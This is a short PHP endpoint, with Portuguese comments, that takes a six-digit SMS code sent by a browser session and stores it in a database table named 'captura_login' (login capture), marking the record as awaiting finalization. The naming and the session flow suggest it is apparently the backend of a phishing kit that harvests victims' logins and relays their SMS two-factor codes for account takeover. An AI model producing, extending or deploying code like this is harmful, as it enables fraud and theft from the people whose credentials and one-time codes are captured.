<?php
header('Content-Type: application/json');
session_start();
require 'db.php';

// Pega o ID do cliente do cookie que foi salvo no início
$cookie_id = $_COOKIE['identificador_cliente'] ?? null;
if (!$cookie_id) {
    echo json_encode(['success' => false, 'error' => 'Sessão inválida.']);
    exit;
}

// Pega o código SMS do corpo da requisição
$data = json_decode(file_get_contents('php://input'), true);
$sms_code = $data['sms_code'] ?? null;

if (empty($sms_code) || strlen($sms_code) !== 6) {
    echo json_encode(['success' => false, 'error' => 'Código SMS inválido.']);
    exit;
}

try {
    // 💡 CONSULTA CORRIGIDA PARA POSTGRESQL
    // A subconsulta encontra o 'id' da linha mais recente para a sessão
    // e o UPDATE principal usa esse 'id' para garantir que apenas uma linha seja alterada.
    $sql = "UPDATE captura_login
            SET sms_code = ?, status = 'aguardando_finalizacao'
            WHERE id = (
                SELECT id FROM captura_login
                WHERE session_id = ?
                ORDER BY id DESC
                LIMIT 1
            )";
    
    $stmt = $pdo->prepare($sql);
    $stmt->execute([$sms_code, $cookie_id]);

    if ($stmt->rowCount() > 0) {
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Nenhum registro encontrado para esta sessão.']);
    }

} catch (PDOException $e) {
    // Logar o erro real para depuração no servidor
    error_log("Erro no banco de dados: " . $e->getMessage());
    
    // Enviar resposta de erro 500 genérica
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Erro interno do servidor.']);
}
?>